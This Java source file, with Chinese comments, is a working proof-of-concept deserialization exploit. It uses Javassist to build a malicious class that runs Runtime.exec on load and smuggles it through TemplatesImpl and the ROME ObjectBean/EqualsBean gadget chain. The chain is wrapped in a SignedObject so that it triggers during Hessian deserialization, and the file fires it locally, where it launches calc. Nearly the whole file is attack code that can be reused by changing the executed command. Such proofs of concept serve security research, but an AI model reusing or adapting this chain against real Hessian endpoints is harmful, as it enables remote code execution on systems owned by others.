package signedObject;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import sun.security.provider.DSAPrivateKey;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;

public class Demo {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, SignatureException, InvalidKeyException, CannotCompileException, ClassNotFoundException, NotFoundException {
        HashMap hashMapx=getObject();

        //构造SignedObject对象
        SignedObject signedObject=new SignedObject(hashMapx, new DSAPrivateKey(), new Signature("x") {
            @Override
            protected void engineInitVerify(PublicKey publicKey) throws InvalidKeyException {

            }

            @Override
            protected void engineInitSign(PrivateKey privateKey) throws InvalidKeyException {

            }

            @Override
            protected void engineUpdate(byte b) throws SignatureException {

            }

            @Override
            protected void engineUpdate(byte[] b, int off, int len) throws SignatureException {

            }

            @Override
            protected byte[] engineSign() throws SignatureException {
                return new byte[0];
            }

            @Override
            protected boolean engineVerify(byte[] sigBytes) throws SignatureException {
                return false;
            }

            @Override
            protected void engineSetParameter(String param, Object value) throws InvalidParameterException {

            }

            @Override
            protected Object engineGetParameter(String param) throws InvalidParameterException {
                return null;
            }
        });

        ObjectBean delegate = new ObjectBean(SignedObject.class,signedObject);

        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "xsw6"));

        HashMap<Object, Object> map = new HashMap<>();
        map.put(root, "xs");

        Field field = ObjectBean.class.getDeclaredField("_equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));


        ByteArrayOutputStream ser = new ByteArrayOutputStream();
        HessianOutput hessianOutput=new HessianOutput(ser);
        hessianOutput.writeObject(map);
        hessianOutput.close();

        System.out.println(ser);
        HessianInput hessianInput=new HessianInput(new ByteArrayInputStream(ser.toByteArray()));
        hessianInput.readObject();
    }

    public static void setFieldValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field=obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj,value);
    }

    //获取原生反序列化对象
    public static HashMap getObject() throws NoSuchFieldException, IllegalAccessException, CannotCompileException, ClassNotFoundException, IOException, NotFoundException {
        //构造TemplatesImpl对象
        //构造恶意类
        ClassPool pool = ClassPool.getDefault();
        CtClass abstractTranslet = pool.get(AbstractTranslet.class.getName());
        CtClass clazz = pool.makeClass("evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"calc\"});";
        clazz.makeClassInitializer().insertBefore(cmd);
        clazz.setSuperclass(abstractTranslet);

        TemplatesImpl templates = new TemplatesImpl();
        Class aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        Field name = aClass.getDeclaredField("_name");
        Field tfactory = aClass.getDeclaredField("_tfactory");
        bytecodes.setAccessible(true);
        name.setAccessible(true);
        tfactory.setAccessible(true);

        bytecodes.set(templates,new byte[][]{clazz.toBytecode()});
        name.set(templates,"xsw6");
        tfactory.set(templates,new TransformerFactoryImpl());



        //Rome利用
        ObjectBean delegate = new ObjectBean(Templates.class, templates);

        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "xsw6"));

        HashMap<Object, Object> map = new HashMap<>();
        map.put(root, "xs");

        Field field = ObjectBean.class.getDeclaredField("_equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));

        return  map;
    }
}
